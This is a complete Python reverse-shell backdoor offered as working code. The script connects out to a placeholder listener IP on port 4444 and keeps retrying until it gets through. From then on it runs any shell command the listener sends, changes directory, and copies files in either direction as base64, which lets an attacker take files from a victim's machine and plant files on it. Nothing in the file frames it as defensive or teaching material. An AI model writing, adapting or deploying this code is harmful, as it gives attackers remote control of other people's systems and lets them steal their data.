import socket
import subprocess
import json
import os
import base64

def run_backdoor(ip, port):
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            connection.connect((ip, port))
        except ConnectionRefusedError:
            continue
        break
    #receives command
    while True:
        command_json = ""
        try:
            chunk = connection.recv(8192).decode() #byte -> json_obj
            if not chunk:
                break
            command_json += chunk
            command = json.loads(command_json)  # json_obj -> string

        except json.decoder.JSONDecodeError:
            continue

        if command == "exit":
            connection.close()
            exit()

        elif command[0].lower() == "cd" and len(command) > 1:
            command_result = change_working_dir(command[1])

        elif command[0].lower() == "download":
            command_result_byte = read_file(command[1])
            #need to decode because we need to send string to reliable_send not byte
            command_result = command_result_byte.decode() #converting byte to string

        elif command[0].lower() == "upload":
            file_path = command[1]
            file_content = command[2]
            if file_content == "[-] File not found":
                command_result = "\n[-] File not found\n"
            else:
                command_result = write_file(file_path, file_content)
        else:
            command_result = exe_command(command)
        reliable_send(connection, command_result)

def reliable_send(connection, data):
    json_data = json.dumps(data)  # ->string to json obj
    connection.sendall(json_data.encode()) #json_obj -> byte

def change_working_dir(path):
    try:
        os.chdir(path)
        return f"\n[+] Changing working directory to {path}\n"
    except FileNotFoundError:
        return "\n[-] File not found\n"

def write_file(path, content):
    with open(path,"wb") as file:
        file.write(base64.b64decode(content)) # decoding base64 cause we encoded while sending
        return "\n[+] Upload successful\n"

def read_file(path):
    try:
        with open(path,"rb") as file:
            return base64.b64encode(file.read()) # encoding for all beacause can't read .jpeg/jpg file without it
    except FileNotFoundError:
        return b"[-] File not found"
def exe_command(command):
    while True:
        try:
            command_result = subprocess.check_output(command, shell=True, text=True) #text=True if not then it returns byte
            return command_result
        except subprocess.CalledProcessError:
            message = "\n[-] Got typo error _command isn't recognized.\n"
            return message
        except Exception as e:
            message = f"[-] An error occurred: {str(e)}"
            return message

run_backdoor("LISTENER_IP", 4444) #4444 -> IS PORT TO LISTEN ON. YOU CAN CUSTOMIZE AS YOUR PREFERENCE BUT THE SAME IN BOTH CODE

